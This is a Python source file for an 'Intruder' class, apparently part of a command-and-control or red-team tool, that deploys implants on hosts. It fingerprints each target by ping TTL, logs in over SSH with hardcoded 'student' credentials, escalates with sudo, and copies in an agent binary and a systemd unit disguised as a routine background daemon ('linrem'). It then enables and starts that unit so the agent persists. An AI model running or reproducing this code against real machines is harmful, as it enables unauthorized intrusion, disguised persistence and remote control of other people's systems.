import subprocess
import time
import paramiko
from paramiko import SSHClient
from scp import SCPClient
from pathlib import Path
import re

service = """[Unit]
Description=Regular background program processing daemon
Documentation=man:linrem(28)
After=network

[Service]
ExecStart=/usr/bin/linrem
KillMode=process
Restart=on-failure

[Install]
WantedBy=multi-user.target
"""

port_dict = {
    '22': 'ssh',
    '80': 'http',
    '3389': 'rdp'
}


class Intruder:
    def __init__(self, apiclient):
        Path("tmp").mkdir(parents=True, exist_ok=True)
        f = open("tmp/linrem.service", 'w')
        f.write(service)
        f.close()
        self._apiClient = apiclient

    def intrude(self,
                ips: list):
        results = []
        for ip in ips:
            targetos = self.fingerprint(ip)
            result = self.pwn(ip, targetos)
            results.append(result)
        return results

    def fingerprint(self, ip):
        try:
            pingresult = subprocess.check_output(['ping', '-c1', f'{ip}'])
            x = re.search(b"ttl=\d{1,3}", pingresult)
            ttl = int(x.group().split(b'=')[1].decode('utf8'))
            if (ttl-64) > 0:
                return 'Windows'
            return 'Linux'
        except ValueError:
            print('[Slagroom] Fingerprinting failed')
            return 'Linux'

    def pwn(self, ip, targetos):
        agent = self._apiClient.create_agent(targetos, ipAddress=ip)
        self._apiClient.get_bin(agent['_id'], agent['communicationToken'], ip)
        client = SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, port=22, username='student', password='student')
        scp = SCPClient(client.get_transport())
        scp.put(f'tmp/{ip}', '/tmp/tmp.raNFfxyoxr')
        scp.put(f'tmp/linrem.service', '/tmp/tmp.oSFEjRVkTb')
        channel = client.invoke_shell()
        time.sleep(2)
        channel.recv(2048)
        channel.send(b'sudo bash\n')
        time.sleep(1)
        channel.send(b'student\n')
        time.sleep(3)
        channel.send(b' mv /tmp/tmp.oSFEjRVkTb /lib/systemd/system/linrem.service'
                     b' && chmod 644 /lib/systemd/system/linrem.service'
                     b' && mv /tmp/tmp.raNFfxyoxr /usr/bin/linrem'
                     b' && chmod +x /usr/bin/linrem'
                     b' && ln -s /lib/systemd/system/linrem.service'
                     b' /etc/systemd/system/multi-user.target.wants/linrem.service'
                     b' && systemctl start linrem\n')
        time.sleep(3)
        channel.close()
        scp.close()
        client.close()
        return True
